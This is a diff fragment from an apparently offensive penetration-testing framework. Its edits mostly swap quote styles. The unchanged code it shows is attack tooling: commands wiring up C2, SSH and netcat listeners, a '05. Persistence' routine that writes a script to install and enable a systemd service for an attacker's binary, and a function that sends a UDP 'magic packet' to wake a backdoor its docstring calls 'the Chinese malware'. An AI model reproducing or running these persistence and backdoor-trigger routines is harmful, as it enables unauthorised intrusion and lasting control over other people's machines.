-        self.onecmd(f'assign lport {port}')
-        self.onecmd(f'assign listener {listener}')
-        self.onecmd(f'c2 {line} {choice}')
-        self.onecmd(f'ssh_cmd {command}')
-        self.onecmd(f'nc {listener}')
+        self.onecmd(f"assign rport {port}")
+        self.onecmd(f"assign lport {port}")
+        self.onecmd(f"assign listener {listener}")
+        self.onecmd(f"c2 {line} {choice}")
+        self.onecmd(f"ssh_cmd {command}")
+        self.onecmd(f"nc {listener}")
         return
 
     @cmd2.with_category("05. Persistence")
@@ -1675,7 +1712,7 @@ class PersistMigratedCommandSet(LazyOwnCommandSet):
             >>> service my_binary_name
         """
         binary_name = line.strip()
-        lhost = self.params['lhost']
+        lhost = self.params["lhost"]
         if not binary_name:
             print_error("No binary name provided.")
             return
@@ -1705,7 +1742,7 @@ class PersistMigratedCommandSet(LazyOwnCommandSet):
         sudo systemctl daemon-reload &&
         sudo systemctl start {binary_name} &&
         sudo systemctl enable {binary_name}
-        """.replace('        ','')
+        """.replace("        ", "")
 
         service_file_path = os.path.join(self.sessions_dir, f"{binary_name}_service.sh")
 
@@ -1731,10 +1768,10 @@ class PersistMigratedCommandSet(LazyOwnCommandSet):
         Sends a magic packet to the Chinese malware.
         The function extracts self.params['rhost'] and rport from self.params['rhost'] and self.params['rport'], respectively.
         """
-        rhost = self.params['rhost']
+        rhost = self.params["rhost"]
         rport = self.params.get("rport")
 
-        if not self.params['rhost'] or not rport:
+        if not self.params["rhost"] or not rport:
             raise ValueError("self.params['rhost'] and rport must be specified in params")
 
         try:
@@ -1742,9 +1779,9 @@ class PersistMigratedCommandSet(LazyOwnCommandSet):
         except ValueError:
             raise ValueError("rport must be an integer")
 
-        magic_packet = struct.pack('!I4sH14s', 0xDEADBEEF, socket.inet_aton(self.params['rhost']), rport, b'justforfun')
+        magic_packet = struct.pack("!I4sH14s", 0xDEADBEEF, socket.inet_aton(self.params["rhost"]), rport, b"justforfun")
         with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
-            sock.sendto(magic_packet, (self.params['rhost'], rport))
+            sock.sendto(magic_packet, (self.params["rhost"], rport))
 
         print_msg(f"Magic packet sent to {self.params['rhost']}:{rport}")
 
